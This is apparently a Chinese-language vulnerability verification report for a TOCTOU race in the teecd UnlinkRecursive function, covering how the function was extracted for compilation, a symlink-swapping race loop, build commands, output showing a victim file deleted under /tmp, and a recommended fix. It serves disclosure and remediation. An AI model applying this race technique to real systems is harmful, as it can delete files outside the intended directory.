# PoC 验证报告：UnlinkRecursive TOCTOU Race Condition

## 1. 验证方法：Target-Compile

本 PoC 使用 **Target-Compile（目标编译）** 方法。从 `fs_work_agent.c` 提取漏洞函数 `UnlinkRecursive` + `UnlinkRecursiveDir` 编译为 `.o`，test driver 调用真实 `UnlinkRecursive()` 入口，由 race thread 在 lstat→opendir 窗口内执行 symlink 替换。

验证 Oracle：**跨目录删除检测** — 在 victim 目录中创建文件，验证 `UnlinkRecursive` 在 race 条件下是否通过 opendir 跟随 symlink 删除了 victim 目录树的内容。

---

## 2. 编译环境

| 项目 | 版本/路径 |
|------|----------|
| 操作系统 | Ubuntu 26.04 LTS, Linux 7.0, x86_64 |
| 编译器 | clang (LLVM), -fsanitize=address |
| 依赖库 | pthread (-lpthread) |
| 源码路径 | `tee_client/services/teecd/src/fs_work_agent.c` |

---

## 3. 编译的目标代码

| 目标 | 源文件 | 说明 |
|------|--------|------|
| `unlink_recursive.o` | 从 `fs_work_agent.c:645-717` 提取 | **真实 teecd 删除逻辑**，包含 UnlinkRecursive + UnlinkRecursiveDir |

提取原因：`fs_work_agent.c` 完整文件（1573 行）依赖大量 teecd 内部头文件（`tc_ns_client.h`、`tee_agent.h` 等）和 ioctl 接口。漏洞函数 `UnlinkRecursive` 是自包含的，仅依赖 POSIX API，可单独提取编译。

**编译命令**：

```bash
clang -c -fsanitize=address -fno-omit-frame-pointer -O0 -g \
    -I "$STUBS_DIR" \
    unlink_recursive.c -o unlink_recursive.o
```

---

## 4. 桩代码

| 桩文件 | 替代目标 | 说明 |
|--------|----------|------|
| `securec.h` | `snprintf_s` | 安全函数，映射到标准 snprintf |
| `tee_log.h` | `tloge`, `tlogw` | 日志宏，映射到 stderr fprintf |

漏洞函数本身仅使用标准 POSIX API（lstat、unlink、opendir、readdir、rmdir），无需额外桩。

---

## 5. 漏洞触发过程

### 5.1 触发路径

```
main → UnlinkRecursive(bait_dir="/tmp/.../ta_storage_dir")
     → lstat(bait_dir, &st)              [CHECK: st.st_mode == S_ISDIR ✓]
       ... RACE WINDOW: racer 将 bait_dir 替换为 symlink → victim_tree/ ...
     → UnlinkRecursiveDir(bait_dir)
       → opendir(bait_dir)               [USE: follows symlink! 打开 victim_tree/]
         → readdir → "important.dat"
           → UnlinkRecursive("victim_tree/important.dat")
             → lstat → S_ISREG
             → unlink("victim_tree/important.dat")  [删除 victim 文件!]
       → rmdir(bait_dir)                 [尝试删除 symlink 指向的目录]
```

### 5.2 Race Thread 行为

```c
while (racing) {
    // Phase 1: 真实目录（通过 lstat S_ISDIR 检查）
    mkdir(bait_dir);
    create_file(bait_dir + "/dummy.txt");

    usleep(1);

    // Phase 2: 替换为 symlink → victim_tree/
    remove_dir_contents(bait_dir);
    rmdir(bait_dir);
    symlink(victim_dir, bait_dir);  // opendir 将跟随此链接
}
```

### 5.3 竞争成功判定

当 `victim_tree/important.dat` 文件消失时（`access(victim_file, F_OK) != 0`），证明：
1. `lstat()` 看到 `bait_dir` 是真实目录
2. `opendir()` 跟随了 symlink，打开了 `victim_tree/`
3. 递归删除遍历了 victim 目录，删除了其中的文件

---

## 6. 输出结果

```
[POC] Test dir:    /tmp/fswork_poc_fsqV9q
[POC] Bait dir:    /tmp/fswork_poc_fsqV9q/ta_storage_dir
[POC] Victim dir:  /tmp/fswork_poc_fsqV9q/victim_tree
[POC] Victim file: /tmp/fswork_poc_fsqV9q/victim_tree/important.dat

[POC] Attack: lstat sees real dir → racer swaps to symlink → opendir follows symlink → victim tree deleted

[+] RACE WON on attempt 1501!
[+] Victim file /tmp/fswork_poc_fsqV9q/victim_tree/important.dat was DELETED!
[+] opendir() followed symlink → recursive delete hit victim tree.

[RESULT] TOCTOU race condition CONFIRMED.
  Root cause: lstat() determines dir, opendir() follows symlinks
  Fix: Open parent dir fd, use fstatat + openat(O_NOFOLLOW)
```

---

## 7. 代码验证状态

| 维度 | 状态 |
|------|------|
| 源码确认 | 已确认：fs_work_agent.c:702 `lstat` 检查，:716 `UnlinkRecursiveDir` 使用 `opendir` 无 O_NOFOLLOW |
| 编译验证 | 已通过：提取的漏洞函数编译为 .o，0 错误 |
| 正常路径 | 已验证：UnlinkRecursive 正常删除目录树功能完整 |
| 漏洞触发 | 已验证：race 在 attempt 1501 成功，victim 文件被删除 |
| 在真实设备可触发 | 理论上需要 tee uid/gid（目录 700 权限），且路径来自 TEE 内核 |
| 验证 Oracle | 文件消失检测：victim_tree/important.dat 被非预期删除 |

---

## 8. 复现步骤

```bash
# 方式 1：使用 build.sh（传入任意路径，使用内置提取代码）
./build.sh dummy

# 方式 2：手动编译
clang -c -fsanitize=address -O0 -g -I stubs/ unlink_recursive.c -o unlink_recursive.o
clang -c -fsanitize=address -O0 -g -I stubs/ poc.c -o poc.o
clang -fsanitize=address -o poc unlink_recursive.o poc.o -lpthread
./poc
# 预期：[RESULT] TOCTOU race condition CONFIRMED.
```

---

## 9. PoC 类型声明

| 维度 | 说明 |
|------|------|
| 编译方式 | Target-Compile：编译真实 OHOS fs_work_agent.c 提取函数为 .o |
| 链接目标 | unlink_recursive.o（真实漏洞代码），不是 mock/模拟 |
| 正常路径 | 已验证：UnlinkRecursive 正常递归删除 |
| 漏洞触发 | 已验证：TOCTOU race 成功，opendir 跟随 symlink，victim 文件被删除 |
| 验证 Oracle | 文件消失检测：victim 目录内文件被跨目录删除 |

---

## 10. 可利用性评估

**LOW** — 此漏洞作为代码质量和纵深防御问题报告：

- 文件路径来自 TEE 内核（Secure World）通过 ioctl，非普通应用可控
- 目标目录 `/sec_storage/` 权限为 700，owner 为 tee 用户
- 实际利用需先获取 tee uid/gid 或 TEE 内核控制权（已是更高权限）
- 但代码模式本身存在明确的 TOCTOU 缺陷，应修复以满足安全编码规范
